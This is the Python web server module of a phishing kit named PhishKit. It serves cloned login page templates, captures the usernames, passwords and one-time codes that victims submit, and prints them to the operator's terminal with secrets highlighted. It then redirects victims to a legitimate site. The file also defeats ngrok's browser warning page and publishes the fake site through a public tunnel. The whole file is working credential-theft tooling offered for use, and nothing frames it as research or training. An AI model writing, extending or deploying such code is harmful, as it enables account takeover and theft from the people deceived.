"""
PhishKit — Web server module (LIVE CAPTURES ONLY, NO DISK LOGGING)
"""

import os
import sys
import json
import threading
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, send_from_directory

app = Flask(__name__)

# ─── Bypass ngrok free-tier interstitial page ───
@app.after_request
def bypass_ngrok_interstitial(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response

server_config = {}
tunnel_instance = None

TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "templates")
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "output")


def colorize_capture(entry):
    """Pretty-print a capture to terminal with colors."""
    ts = entry["timestamp"]
    ip = entry["ip"]
    log_type = entry["type"].upper()
    data = entry["data"]
    ua = entry.get("user_agent", "Unknown")

    # Detect mobile
    device = "📱 MOBILE" if any(x in ua for x in ["Android", "iPhone", "Mobile"]) else "💻 DESKTOP"

    print(f"\n{'═' * 60}")
    print(f"  🔥 {log_type} CAPTURED @ {ts}")
    print(f"{'═' * 60}")
    print(f"  🆔 IP      : {ip}")
    print(f"  📟 Device  : {device}")
    print(f"  🌐 UA      : {ua[:80]}...")

    for key, val in data.items():
        # Highlight password/secret fields
        if any(x in key.lower() for x in ["pass", "secret", "token", "key", "otp"]):
            print(f"  🔑 {key:12}: \033[93m{val}\033[0m")  # Yellow
        else:
            print(f"  📧 {key:12}: {val}")

    print(f"{'═' * 60}\n")


@app.route("/")
def index():
    template_name = server_config["campaign"]["template"]
    template_path = os.path.join(TEMPLATES_DIR, template_name, "index.html")

    if not os.path.exists(template_path):
        return "Template not found", 404

    with open(template_path, "r") as f:
        html_content = f.read()

    return render_template_string(html_content)


@app.route("/login", methods=["POST"])
def login():
    data = request.form.to_dict()
    if not data:
        data = request.get_json(silent=True) or {}

    if server_config["campaign"]["capture_credentials"]:
        capture_data(data)

    redirect_url = server_config["campaign"].get("redirect_url", "https://www.google.com")
    return redirect(redirect_url), 302


@app.route("/assets/<path:filename>")
def serve_assets(filename):
    template_name = server_config["campaign"]["template"]
    assets_dir = os.path.join(TEMPLATES_DIR, template_name, "assets")
    return send_from_directory(assets_dir, filename)


@app.route("/otp", methods=["POST"])
def otp():
    data = request.form.to_dict() or request.get_json(silent=True) or {}
    if server_config["campaign"].get("capture_otp", False):
        capture_data(data, log_type="otp")
    return {"status": "ok"}, 200


def capture_data(data, log_type="credentials"):
    """Live capture — NO file writes, streams to terminal only."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    entry = {
        "timestamp": timestamp,
        "type": log_type,
        "ip": client_ip,
        "user_agent": user_agent,
        "data": data,
    }

    # ─── LIVE OUTPUT ONLY ───
    colorize_capture(entry)


def run_server(config):
    global server_config, tunnel_instance
    server_config = config

    host = config["server"]["host"]
    port = config["server"]["port"]

    # Start tunnel if enabled
    if config["tunnel"]["enabled"]:
        tunnel_instance = start_tunnel(config, port)

    ssl_context = None
    if config["server"]["ssl"] and config["server"]["ssl_cert"] and config["server"]["ssl_key"]:
        ssl_context = (config["server"]["ssl_cert"], config["server"]["ssl_key"])

    app.run(host=host, port=port, ssl_context=ssl_context, debug=False)


def start_tunnel(config, local_port):
    """Start tunnel and return the public URL."""
    from modules.tunneler import TunnelManager
    
    provider = config["tunnel"]["provider"]
    auth_token = config["tunnel"].get("ngrok_auth_token", "")
    
    manager = TunnelManager(provider=provider, local_port=local_port, auth_token=auth_token)
    public_url = manager.start()
    
    if public_url:
        print(f"\n  🌐 Public URL: {public_url}")
        if provider == "ngrok":
            print(f"     (ngrok interstitial bypassed via header)")
        elif provider == "localtunnel":
            print(f"     (localtunnel - no interstitial)")
    else:
        print(f"\n  ⚠️  Tunnel started but URL unknown. Check ngrok dashboard at http://127.0.0.1:4040")
    
    return manager
